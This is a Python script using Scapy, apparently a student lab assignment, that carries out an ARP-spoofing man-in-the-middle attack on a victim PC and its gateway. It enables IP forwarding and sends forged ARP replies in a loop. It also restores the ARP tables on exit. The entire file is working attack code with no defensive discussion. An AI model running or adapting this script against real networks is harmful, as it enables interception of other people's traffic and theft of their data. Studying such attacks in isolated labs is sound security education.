#!/usr/bin/env python3
# ============================================
# Ataque Man in the Middle mediante ARP Spoofing
# Autor: Emmanuel Orlando Rodriguez
# Matricula: 2025-0798
# Archivo: EmmanuelRodriguez_2025-0798_arp_mitm_P1.py
# ============================================

from scapy.all import *
import time
import os
import sys

TARGET_IP  = "192.168.79.10"   # PC1 Victima
GATEWAY_IP = "192.168.79.1"    # Router R1
IFACE      = "eth1"

def get_mac(ip):
    print(f"[*] Obteniendo MAC de {ip}...")
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    ans, _ = srp(broadcast/arp_req, timeout=3, verbose=False, iface=IFACE)
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] No se pudo obtener la MAC de {ip}")
        sys.exit(1)

def arp_poison(target_ip, gateway_ip, target_mac, gateway_mac):
    pkt_target = ARP(op=2, pdst=target_ip,
                     hwdst=target_mac, psrc=gateway_ip)
    pkt_gateway = ARP(op=2, pdst=gateway_ip,
                      hwdst=gateway_mac, psrc=target_ip)
    send(pkt_target, verbose=False, iface=IFACE)
    send(pkt_gateway, verbose=False, iface=IFACE)

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    print("\n[*] Restaurando tablas ARP...")
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=target_ip, hwsrc=target_mac),
             count=5, verbose=False, iface=IFACE)
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=gateway_ip, hwsrc=gateway_mac),
             count=5, verbose=False, iface=IFACE)
    print("[+] Tablas ARP restauradas correctamente.")

if __name__ == "__main__":
    print("="*50)
    print("  Ataque MitM - ARP Spoofing")
    print("  Autor: Emmanuel Orlando Rodriguez")
    print("  Matricula: 2025-0798")
    print("="*50)
    print(f"[*] Target:   {TARGET_IP}")
    print(f"[*] Gateway:  {GATEWAY_IP}")
    print(f"[*] Interfaz: {IFACE}\n")

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding habilitado")

    target_mac  = get_mac(TARGET_IP)
    gateway_mac = get_mac(GATEWAY_IP)

    print(f"[+] MAC Victima:  {target_mac}")
    print(f"[+] MAC Gateway:  {gateway_mac}")
    print("\n[*] Iniciando envenenamiento ARP...")
    print("[*] Presiona Ctrl+C para detener\n")

    enviados = 0
    try:
        while True:
            arp_poison(TARGET_IP, GATEWAY_IP, target_mac, gateway_mac)
            enviados += 1
            print(f"  [+] Paquetes ARP enviados: {enviados*2}", end="\r")
            time.sleep(2)

    except KeyboardInterrupt:
        restore_arp(TARGET_IP, GATEWAY_IP, target_mac, gateway_mac)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] IP Forwarding deshabilitado")
        print(f"[*] Total paquetes enviados: {enviados*2}")
